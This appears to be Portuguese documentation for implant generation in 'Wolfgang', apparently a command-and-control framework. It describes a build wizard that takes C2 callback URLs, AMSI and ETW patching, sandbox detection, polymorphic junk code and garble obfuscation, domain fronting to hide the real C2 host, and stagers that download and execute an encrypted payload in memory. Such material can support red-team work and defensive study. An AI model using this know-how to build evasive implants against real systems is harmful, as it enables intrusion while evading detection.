    Geracao de Implants¶

    O sistema de build do Wolfgang compila binarios customizados com configuracao embutida via -ldflags. Cada implant e unico -- OS, arquitetura, transport, callbacks e evasion flags sao definidos no momento da geracao.

    Pipeline de build¶

    flowchart LR
    A[Request] --> B[Validate]
    B --> C[Config Embed
    via ldflags]
    C --> D{Polymorphic?}
    D -->|Sim| E[Gerar Junk Code]
    E --> F[Compile]
    D -->|Nao| F
    F --> G{Garble?}
    G -->|Sim| H[garble build
    -literals -tiny]
    G -->|Nao| I[go build
    -trimpath]
    H --> J[Output Binary]
    I --> J
    J --> K[Result:
    path, size, OS, arch]

    Geracao via CLI¶

    O comando generate no client inicia um wizard interativo:

    wolfgang>> generate
Target OS (linux/windows/darwin): windows
Target arch (amd64/arm64/386) [amd64]: amd64
Transport (https/dns/ws) [https]: https
Output type (implant/stager) [implant]: implant
Callback URL(s) (comma-separated): https://c2.example.com:443
Sleep interval (ms) [5000]: 10000
Jitter (0-100) [10]: 20
Format (exe/elf/macho) [exe]: exe
Use garble obfuscation? (y/N): y
Enable dynamic modules? (y/N): y
[*] Building implant... this may take a moment.
[+] Implant saved: implant_windows_amd64.exe (windows/amd64, 4521984 bytes)

    Parametros de geracao¶

    Parametros basicos¶

    Parametro Valores Padrao Descricao
    os linux, windows, darwin Runtime atual Sistema operacional alvo
    arch amd64, arm64, 386 Runtime atual Arquitetura do processador
    transport https, dns, ws, doh https Transport primario
    callback Lista de URLs (obrigatorio) URLs de callback (primeiro = primario, demais = fallback)
    sleep Inteiro (ms) 5000 Intervalo de check-in em milissegundos
    jitter 0-100 10 Percentual de variacao no sleep
    format exe, elf, macho Auto do OS Formato do binario de saida
    profile Nome do profile default Malleable profile para HTTPS

    Parametros de evasion¶

    Parametro Tipo Descricao
    use_garble bool Usar garble para ofuscacao de strings e literals
    polymorphic bool Aplicar transformacoes polimorficas antes do build
    auto_amsi bool Patch AMSI automaticamente no startup (Windows)
    auto_etw bool Patch ETW automaticamente no startup (Windows)
    auto_sandbox bool Habilitar deteccao de sandbox
    sandbox_threshold int Minimo de checks que devem passar antes de executar
    sleep_encrypt bool Criptografar heap durante o sleep

    Parametros de transport¶

    Parametro Descricao
    transport_priority Lista ordenada de transports para fallback
    fronting_domain Dominio CDN para domain fronting
    actual_host Header Host real (para domain fronting)
    dns_domain Zona DNS autoritativa (transport DNS/DoH)
    dns_resolvers Resolvers DNS separados por virgula (transport DoH)
    dynamic_modules Habilitar carregamento de modulos sob demanda

    Formatos de saida¶

    Formato OS Extensao Descricao
    exe Windows .exe Executavel PE
    elf Linux (nenhuma) Executavel ELF
    macho macOS (nenhuma) Executavel Mach-O

    O formato e inferido automaticamente do OS se nao especificado. Especificar um formato incompativel com o OS retorna erro (ex: exe com linux).

    Matriz de plataformas¶

    amd64 arm64 386
    Windows Sim Sim Sim
    Linux Sim Sim Sim
    macOS Sim Sim --

    Todos os builds usam CGO_ENABLED=0 para cross-compilation sem dependencias.

    Transformacoes polimorficas¶

    Quando polymorphic: true, o build system aplica transformacoes antes da compilacao:

    Junk code injection¶

    Gera entre 3 e 10 funcoes Go aleatorias com operacoes aritmeticas (+, -, ^, |, &). As funcoes sao marcadas com //go:noinline para evitar otimizacao do compilador.

    Exemplo de funcao gerada:

    //go:noinline
func junk_a3f2b1c8() int {
    v0 := 42 + 17
    v1 := 88 ^ 23
    v2 := 5 - 91
    return v0 + v1 ^ v2
}

    Um init() chama todas as funcoes e armazena o resultado em _junkSink, prevenindo dead code elimination.

    Build ID stripping¶

    Com polymorphic habilitado, a flag -buildid= e adicionada ao ldflags, removendo o build ID do binario.

    Random gcflags¶

    O compilador recebe gcflags aleatorios entre "", "-N", "-l" e "-N -l", alterando o padrao de otimizacao do binario.

    Limpeza¶

    Arquivos junk (junk_*.go) sao removidos automaticamente apos o build, via defer.

    Garble¶

    Quando use_garble: true e o garble esta instalado no PATH:

    garble -literals -tiny -seed=random build -trimpath -ldflags="..." -o output ./cmd/implant

    Flags do garble:

    • -literals -- ofusca strings literais no binario
    • -tiny -- remove informacoes de debug extras
    • -seed=random -- semente aleatoria para reprodutibilidade impossivel

    Se garble nao estiver disponivel, o build usa go build padrao silenciosamente.

    Domain fronting¶

    Para encaminhar trafego via CDN:

    Callback URL: https://cdn.example.com:443
Fronting Domain: cdn.example.com
Actual Host: real-c2.example.com

    O implant conecta no IP do CDN (cdn.example.com), mas envia Host: real-c2.example.com no header HTTP. O CDN roteia para o backend correto.

    Stagers¶

    Stagers sao binarios minimos que baixam e executam o implant completo. Uteis para delivery inicial com tamanho reduzido.

    Geracao¶

    wolfgang>> generate
Output type (implant/stager) [implant]: stager

    Parametros do stager¶

    Parametro Descricao
    stage_url URL de onde baixar o implant completo
    stage_key Chave AES-256 hex para descriptografar o payload

    O stager:

    1. Faz HTTP GET na stage_url
    2. Descriptografa o payload com stage_key
    3. Executa em memoria (Windows) ou salva e executa (Linux/macOS)

    Ldflags do stager¶

    -s -w -X main.buildStageURL=<url> -X main.buildStageKey=<hex_key>

    Variaveis embutidas via ldflags¶

    Todas as configuracoes sao embutidas no pacote main do implant:

    Variavel Descricao
    buildServerURL URL primaria de callback
    buildCallbackURLs URLs adicionais (comma-separated)
    buildTransport Transport primario
    buildTransportPrio Ordem de fallback de transports
    buildSleep Intervalo de sleep (ms)
    buildJitter Percentual de jitter
    buildProfileName Nome do malleable profile
    buildServerPublicKey Chave publica X25519 do server (hex)
    buildFrontingDomain Dominio para domain fronting
    buildActualHost Host header real
    buildAutoAMSI Auto-patch AMSI
    buildAutoETW Auto-patch ETW
    buildAutoSandbox Deteccao de sandbox
    buildSandboxThreshold Threshold de sandbox
    buildSleepEncrypt Criptografia de heap no sleep
    buildDynamicModules Modulos dinamicos
    buildDNSDomain Zona DNS
    buildDNSResolvers Resolvers DoH

    Todas as variaveis sao stripped do binario com -s -w (strip debug + symbol info).
